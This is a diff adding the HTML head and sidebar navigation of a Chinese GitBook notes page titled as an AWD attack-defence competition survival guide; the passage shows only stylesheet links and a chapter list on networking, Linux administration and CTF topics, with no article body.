@@ -1,0 +1,4536 @@
+
+<!DOCTYPE HTML>
+<html lang="zh-hans" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>浅谈AWD攻防赛的生存攻略 · SkyFish</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search-pro/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-page-toc-button/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-back-to-top-button/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-code/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-accordion/accordion.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-prism/prism-tomorrow.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-theme-comscore/test.css">
+                
+            
+        
+
+    
+
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    
+    <link rel="prev" href="服务配置文件探测.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="输入并搜索" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../">
+            
+                <a href="../../">
+            
+                    
+                    首页
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" >
+            
+                <span>
+            
+                    
+                    数据通信
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" >
+            
+                <span>
+            
+                    
+                    HCIA
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1.1" >
+            
+                <span>
+            
+                    
+                    1.网络概述
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1.1.1" data-path="../../数据通信/HCIA/1.网络概述/1.网络企业基础架构.html">
+            
+                <a href="../../数据通信/HCIA/1.网络概述/1.网络企业基础架构.html">
+            
+                    
+                    1.网络企业基础架构
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.1.2" data-path="../../数据通信/HCIA/1.网络概述/2.网络概述.html">
+            
+                <a href="../../数据通信/HCIA/1.网络概述/2.网络概述.html">
+            
+                    
+                    2.网络概述
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.1.3" data-path="../../数据通信/HCIA/1.网络概述/3.网络模型.html">
+            
+                <a href="../../数据通信/HCIA/1.网络概述/3.网络模型.html">
+            
+                    
+                    3.网络模型
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.1.4" data-path="../../数据通信/HCIA/1.网络概述/4.OSI参考模型.html">
+            
+                <a href="../../数据通信/HCIA/1.网络概述/4.OSI参考模型.html">
+            
+                    
+                    4.OSI参考模型
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.2" >
+            
+                <span>
+            
+                    
+                    2.VRP基础
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1.2.1" data-path="../../数据通信/HCIA/2.VRP基础/1.概述.html">
+            
+                <a href="../../数据通信/HCIA/2.VRP基础/1.概述.html">
+            
+                    
+                    1.概述
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.2.2" data-path="../../数据通信/HCIA/2.VRP基础/2.基础命令.html">
+            
+                <a href="../../数据通信/HCIA/2.VRP基础/2.基础命令.html">
+            
+                    
+                    2.基础命令
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.2.3" data-path="../../数据通信/HCIA/2.VRP基础/3.文件系统.html">
+            
+                <a href="../../数据通信/HCIA/2.VRP基础/3.文件系统.html">
+            
+                    
+                    3.文件系统
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.2.4" data-path="../../数据通信/HCIA/2.VRP基础/4.远程管理.html">
+            
+                <a href="../../数据通信/HCIA/2.VRP基础/4.远程管理.html">
+            
+                    
+                    4.远程管理
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.2.5" data-path="../../数据通信/HCIA/2.VRP基础/5.系统管理.html">
+            
+                <a href="../../数据通信/HCIA/2.VRP基础/5.系统管理.html">
+            
+                    
+                    5.系统管理
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.3" >
+            
+                <span>
+            
+                    
+                    3.TCPIP协议
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1.3.1" data-path="../../数据通信/HCIA/3.TCPIP协议/1.TCP与UDP.html">
+            
+                <a href="../../数据通信/HCIA/3.TCPIP协议/1.TCP与UDP.html">
+            
+                    
+                    1.TCP与UDP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.3.2" data-path="../../数据通信/HCIA/3.TCPIP协议/2.数据链路层.html">
+            
+                <a href="../../数据通信/HCIA/3.TCPIP协议/2.数据链路层.html">
+            
+                    
+                    2.数据链路层
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.3.3" data-path="../../数据通信/HCIA/3.TCPIP协议/3.应用层概述.html">
+            
+                <a href="../../数据通信/HCIA/3.TCPIP协议/3.应用层概述.html">
+            
+                    
+                    3.应用层概述
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.4" >
+            
+                <span>
+            
+                    
+                    4.路由
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1.4.1" data-path="../../数据通信/HCIA/4.路由/ACL.html">
+            
+                <a href="../../数据通信/HCIA/4.路由/ACL.html">
+            
+                    
+                    ACL
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.4.2" data-path="../../数据通信/HCIA/4.路由/ARP.html">
+            
+                <a href="../../数据通信/HCIA/4.路由/ARP.html">
+            
+                    
+                    ARP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.4.3" data-path="../../数据通信/HCIA/4.路由/DHCP.html">
+            
+                <a href="../../数据通信/HCIA/4.路由/DHCP.html">
+            
+                    
+                    DHCP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.4.4" data-path="../../数据通信/HCIA/4.路由/ICMP.html">
+            
+                <a href="../../数据通信/HCIA/4.路由/ICMP.html">
+            
+                    
+                    ICMP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.4.5" data-path="../../数据通信/HCIA/4.路由/IP地址概述.html">
+            
+                <a href="../../数据通信/HCIA/4.路由/IP地址概述.html">
+            
+                    
+                    IP地址概述
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.4.6" data-path="../../数据通信/HCIA/4.路由/IP报文.html">
+            
+                <a href="../../数据通信/HCIA/4.路由/IP报文.html">
+            
+                    
+                    IP报文
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.4.7" data-path="../../数据通信/HCIA/4.路由/NAT.html">
+            
+                <a href="../../数据通信/HCIA/4.路由/NAT.html">
+            
+                    
+                    NAT
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.4.8" data-path="../../数据通信/HCIA/4.路由/OSPF.html">
+            
+                <a href="../../数据通信/HCIA/4.路由/OSPF.html">
+            
+                    
+                    OSPF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.4.9" data-path="../../数据通信/HCIA/4.路由/RIP.html">
+            
+                <a href="../../数据通信/HCIA/4.路由/RIP.html">
+            
+                    
+                    RIP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.4.10" data-path="../../数据通信/HCIA/4.路由/动态路由概述.html">
+            
+                <a href="../../数据通信/HCIA/4.路由/动态路由概述.html">
+            
+                    
+                    动态路由概述
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.4.11" data-path="../../数据通信/HCIA/4.路由/单播、组播、广播.html">
+            
+                <a href="../../数据通信/HCIA/4.路由/单播、组播、广播.html">
+            
+                    
+                    单播、组播、广播
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.4.12" data-path="../../数据通信/HCIA/4.路由/网关及数据转发过程.html">
+            
+                <a href="../../数据通信/HCIA/4.路由/网关及数据转发过程.html">
+            
+                    
+                    网关及数据转发过程
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.4.13" data-path="../../数据通信/HCIA/4.路由/路由基础.html">
+            
+                <a href="../../数据通信/HCIA/4.路由/路由基础.html">
+            
+                    
+                    路由基础
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.4.14" data-path="../../数据通信/HCIA/4.路由/静态路由.html">
+            
+                <a href="../../数据通信/HCIA/4.路由/静态路由.html">
+            
+                    
+                    静态路由
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.5" >
+            
+                <span>
+            
+                    
+                    5.交换
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1.5.1" data-path="../../数据通信/HCIA/5.交换/GARP-GVRP.html">
+            
+                <a href="../../数据通信/HCIA/5.交换/GARP-GVRP.html">
+            
+                    
+                    GARP GVRP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.5.2" data-path="../../数据通信/HCIA/5.交换/PPP.html">
+            
+                <a href="../../数据通信/HCIA/5.交换/PPP.html">
+            
+                    
+                    PPP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.5.3" data-path="../../数据通信/HCIA/5.交换/STP.html">
+            
+                <a href="../../数据通信/HCIA/5.交换/STP.html">
+            
+                    
+                    STP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.5.4" data-path="../../数据通信/HCIA/5.交换/VLAN.html">
+            
+                <a href="../../数据通信/HCIA/5.交换/VLAN.html">
+            
+                    
+                    VLAN
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.5.5" data-path="../../数据通信/HCIA/5.交换/交换机的工作原理.html">
+            
+                <a href="../../数据通信/HCIA/5.交换/交换机的工作原理.html">
+            
+                    
+                    交换机的工作原理
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" >
+            
+                <span>
+            
+                    
+                    软考中级网络工程师
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.1" >
+            
+                <span>
+            
+                    
+                    1.网络通信基础
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.1.1" data-path="../../数据通信/软考中级网络工程师/1.网络通信基础/1.计算机网络概述.md">
+            
+                <span>
+            
+                    
+                    1.计算机网络概述
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.1.2" data-path="../../数据通信/软考中级网络工程师/1.网络通信基础/2.数据通信基础.md">
+            
+                <span>
+            
+                    
+                    2.数据通信基础
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" >
+            
+                <span>
+            
+                    
+                    系统运维
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" >
+            
+                <span>
+            
+                    
+                    Linux
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1.1" data-path="../../系统运维/Linux/Arch+Windows双系统引导恢复.html">
+            
+                <a href="../../系统运维/Linux/Arch+Windows双系统引导恢复.html">
+            
+                    
+                    Arch+Windows双系统引导恢复
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.2" data-path="../../系统运维/Linux/Arch任务栏后台应用没有图标.html">
+            
+                <a href="../../系统运维/Linux/Arch任务栏后台应用没有图标.html">
+            
+                    
+                    Arch任务栏后台应用没有图标
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.3" data-path="../../系统运维/Linux/Arch创建虚拟网卡.html">
+            
+                <a href="../../系统运维/Linux/Arch创建虚拟网卡.html">
+            
+                    
+                    Arch创建虚拟网卡
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.4" data-path="../../系统运维/Linux/Arch双显卡驱动安装.html">
+            
+                <a href="../../系统运维/Linux/Arch双显卡驱动安装.html">
+            
+                    
+                    Arch双显卡驱动安装
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.5" data-path="../../系统运维/Linux/Arch多版本jdk共存以及切换.html">
+            
+                <a href="../../系统运维/Linux/Arch多版本jdk共存以及切换.html">
+            
+                    
+                    Arch多版本jdk共存以及切换
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.6" data-path="../../系统运维/Linux/Arch安装(Btrfs文件系统">
+            
+                <span>
+            
+                    
+                    Arch安装(Btrfs文件系统)
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.7" data-path="../../系统运维/Linux/Arch安装KVM.html">
+            
+                <a href="../../系统运维/Linux/Arch安装KVM.html">
+            
+                    
+                    Arch安装KVM
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.8" data-path="../../系统运维/Linux/Arch安装卸载软件常用命令.html">
+            
+                <a href="../../系统运维/Linux/Arch安装卸载软件常用命令.html">
+            
+                    
+                    Arch安装卸载软件常用命令
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.9" data-path="../../系统运维/Linux/Arch安装问题.html">
+            
+                <a href="../../系统运维/Linux/Arch安装问题.html">
+            
+                    
+                    Arch安装问题
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.10" data-path="../../系统运维/Linux/Arch桌面替换KDE为GNOME.html">
+            
+                <a href="../../系统运维/Linux/Arch桌面替换KDE为GNOME.html">
+            
+                    
+                    Arch桌面替换KDE为GNOME
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.11" data-path="../../系统运维/Linux/Centos常用软件包安装.html">
+            
+                <a href="../../系统运维/Linux/Centos常用软件包安装.html">
+            
+                    
+                    Centos常用软件包安装
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.12" data-path="../../系统运维/Linux/Centos开启VirtualBox增强模式.html">
+            
+                <a href="../../系统运维/Linux/Centos开启VirtualBox增强模式.html">
+            
+                    
+                    Centos开启VirtualBox增强模式
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.13" data-path="../../系统运维/Linux/Debian软件安装.html">
+            
+                <a href="../../系统运维/Linux/Debian软件安装.html">
+            
+                    
+                    Debian软件安装
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.14" data-path="../../系统运维/Linux/RHEL8搭建DNS服务器.html">
+            
+                <a href="../../系统运维/Linux/RHEL8搭建DNS服务器.html">
+            
+                    
+                    RHEL8搭建DNS服务器
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.15" data-path="../../系统运维/Linux/RHEL8搭建本地yum源.html">
+            
+                <a href="../../系统运维/Linux/RHEL8搭建本地yum源.html">
+            
+                    
+                    RHEL8搭建本地yum源
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.16" data-path="../../系统运维/Linux/RHEL8重置Root密码.html">
+            
+                <a href="../../系统运维/Linux/RHEL8重置Root密码.html">
+            
+                    
+                    RHEL8重置Root密码
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.17" data-path="../../系统运维/Linux/Ubuntu常用软件包安装.html">
+            
+                <a href="../../系统运维/Linux/Ubuntu常用软件包安装.html">
+            
+                    
+                    Ubuntu常用软件包安装
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.18" data-path="../../系统运维/Linux/Ubuntu系统网站搭建[LAMP]%20- 副本.md">
+            
+                <span>
+            
+                    
+                    ​Ubuntu系统网站搭建[LAMP]
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.19" data-path="../../系统运维/Linux/Ubuntu系统网站搭建[LAMP].html">
+            
+                <a href="../../系统运维/Linux/Ubuntu系统网站搭建[LAMP].html">
+            
+                    
+                    Ubuntu系统网站搭建[LAMP]
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.20" data-path="../../系统运维/Linux/Ubuntu镜像源加速.html">
+            
+                <a href="../../系统运维/Linux/Ubuntu镜像源加速.html">
+            
+                    
+                    Ubuntu镜像源加速
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" >
+            
+                <span>
+            
+                    
+                    网络安全
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" >
+            
+                <span>
+            
+                    
+                    AWD
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1.1" data-path="AWD-Guide.html">
+            
+                <a href="AWD-Guide.html">
+            
+                    
+                    AWD Guide
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.2" data-path="slowhttptest.html">
+            
+                <a href="slowhttptest.html">
+            
+                    
+                    Slowhttptest
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.3" data-path="WEB服务口令(后台密码">
+            
+                <span>
+            
+                    
+                    WEB服务口令(后台密码)
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.4" data-path="主机端口探测.html">
+            
+                <a href="主机端口探测.html">
+            
+                    
+                    主机端口探测
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.5" data-path="信息修改.html">
+            
+                <a href="信息修改.html">
+            
+                    
+                    信息修改
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.6" data-path="加固.html">
+            
+                <a href="加固.html">
+            
+                    
+                    加固
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.7" data-path="定时备份源码.html">
+            
+                <a href="定时备份源码.html">
+            
+                    
+                    定时备份源码
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.8" data-path="弱口令爆破.html">
+            
+                <a href="弱口令爆破.html">
+            
+                    
+                    弱口令爆破
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.9" data-path="数据库信息修改.html">
+            
+                <a href="数据库信息修改.html">
+            
+                    
+                    数据库信息修改
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.10" data-path="服务配置文件探测.html">
+            
+                <a href="服务配置文件探测.html">
+            
+                    
+                    服务配置文件探测
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.4.1.11" data-path="浅谈AWD攻防赛的生存攻略.html">
+            
+                <a href="浅谈AWD攻防赛的生存攻略.html">
+            
+                    
+                    浅谈AWD攻防赛的生存攻略
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" >
+            
+                <span>
+            
+                    
+                    CTF竞赛
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.1" >
+            
+                <span>
+            
+                    
+                    蓝桥杯
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.1.1" >
+            
+                <span>
+            
+                    
+                    Crypto
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.1.1.1" data-path="../CTF竞赛/蓝桥杯/Crypto/backdoor.html">
+            
+                <a href="../CTF竞赛/蓝桥杯/Crypto/backdoor.html">
+            
+                    
+                    Backdoor
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.1.2" data-path="../CTF竞赛/蓝桥杯/Crypto/classical.html">
+            
+                <a href="../CTF竞赛/蓝桥杯/Crypto/classical.html">
+            
+                    
+                    Classical
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.1.3" data-path="../CTF竞赛/蓝桥杯/Crypto/CyberChef.html">
+            
+                <a href="../CTF竞赛/蓝桥杯/Crypto/CyberChef.html">
+            
+                    
+                    Cyber Chef
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.1.4" data-path="../CTF竞赛/蓝桥杯/Crypto/CyberChef2.html">
+            
+                <a href="../CTF竞赛/蓝桥杯/Crypto/CyberChef2.html">
+            
+                    
+                    Cyber Chef 2
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.1.5" data-path="../CTF竞赛/蓝桥杯/Crypto/RSA.html">
+            
+                <a href="../CTF竞赛/蓝桥杯/Crypto/RSA.html">
+            
+                    
+                    RSA
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.1.6" data-path="../CTF竞赛/蓝桥杯/Crypto/基于国密SM2算法的密钥密文分发.html">
+            
+                <a href="../CTF竞赛/蓝桥杯/Crypto/基于国密SM2算法的密钥密文分发.html">
+            
+                    
+                    基于国密SM2算法的密钥密文分发
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.2" >
+            
+                <span>
+            
+                    
+                    Misc
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.1.2.1" data-path="../CTF竞赛/蓝桥杯/Misc/58与64.html">
+            
+                <a href="../CTF竞赛/蓝桥杯/Misc/58与64.html">
+            
+                    
+                    58与64
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.2.2" data-path="../CTF竞赛/蓝桥杯/Misc/AdvDetPatch（未完成）.html">
+            
+                <a href="../CTF竞赛/蓝桥杯/Misc/AdvDetPatch（未完成）.html">
+            
+                    
+                    AdvDetPatch（未完成）
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.2.3" data-path="../CTF竞赛/蓝桥杯/Misc/BlueMonday.html">
+            
+                <a href="../CTF竞赛/蓝桥杯/Misc/BlueMonday.html">
+            
+                    
+                    Blue Monday
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.2.4" data-path="../CTF竞赛/蓝桥杯/Misc/Classica10.html">
+            
+                <a href="../CTF竞赛/蓝桥杯/Misc/Classica10.html">
+            
+                    
+                    Classica 10
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.2.5" data-path="../CTF竞赛/蓝桥杯/Misc/EasyCrackMe.html">
+            
+                <a href="../CTF竞赛/蓝桥杯/Misc/EasyCrackMe.html">
+            
+                    
+                    Easy Crack Me
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.2.6" data-path="../CTF竞赛/蓝桥杯/Misc/embarrass.html">
+            
+                <a href="../CTF竞赛/蓝桥杯/Misc/embarrass.html">
+            
+                    
+                    Embarrass
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.2.7" data-path="../CTF竞赛/蓝桥杯/Misc/find_the_flag.html">
+            
+                <a href="../CTF竞赛/蓝桥杯/Misc/find_the_flag.html">
+            
+                    
+                    Find The Flag
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.2.8" data-path="../CTF竞赛/蓝桥杯/Misc/flooding.html">
+            
+                <a href="../CTF竞赛/蓝桥杯/Misc/flooding.html">
+            
+                    
+                    Flooding
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.2.9" data-path="../CTF竞赛/蓝桥杯/Misc/happy2forensics.html">
+            
+                <a href="../CTF竞赛/蓝桥杯/Misc/happy2forensics.html">
+            
+                    
+                    Happy 2 Forensics
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.2.10" data-path="../CTF竞赛/蓝桥杯/Misc/Matrix.html">
+            
+                <a href="../CTF竞赛/蓝桥杯/Misc/Matrix.html">
+            
+                    
+                    Matrix
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.2.11" data-path="../CTF竞赛/蓝桥杯/Misc/piphack.html">
+            
+                <a href="../CTF竞赛/蓝桥杯/Misc/piphack.html">
+            
+                    
+                    Piphack
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.2.12" data-path="../CTF竞赛/蓝桥杯/Misc/puzzle.html">
+            
+                <a href="../CTF竞赛/蓝桥杯/Misc/puzzle.html">
+            
+                    
+                    Puzzle
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.2.13" data-path="../CTF竞赛/蓝桥杯/Misc/PyHaHa.html">
+            
+                <a href="../CTF竞赛/蓝桥杯/Misc/PyHaHa.html">
+            
+                    
+                    Py Ha Ha
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.2.14" data-path="../CTF竞赛/蓝桥杯/Misc/pyshell.html">
+            
+                <a href="../CTF竞赛/蓝桥杯/Misc/pyshell.html">
+            
+                    
+                    Pyshell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.2.15" data-path="../CTF竞赛/蓝桥杯/Misc/Random.html">
+            
+                <a href="../CTF竞赛/蓝桥杯/Misc/Random.html">
+            
+                    
+                    Random
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.2.16" data-path="../CTF竞赛/蓝桥杯/Misc/ReCreators.html">
+            
+                <a href="../CTF竞赛/蓝桥杯/Misc/ReCreators.html">
+            
+                    
+                    Re Creators
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.2.17" data-path="../CTF竞赛/蓝桥杯/Misc/SCAN.html">
+            
+                <a href="../CTF竞赛/蓝桥杯/Misc/SCAN.html">
+            
+                    
+                    SCAN
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.2.18" data-path="../CTF竞赛/蓝桥杯/Misc/shellcode.html">
+            
+                <a href="../CTF竞赛/蓝桥杯/Misc/shellcode.html">
+            
+                    
+                    Shellcode
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.2.19" data-path="../CTF竞赛/蓝桥杯/Misc/Warning.html">
+            
+                <a href="../CTF竞赛/蓝桥杯/Misc/Warning.html">
+            
+                    
+                    Warning
+            
+                </a>
+            
+
+            
+        </li>
+    
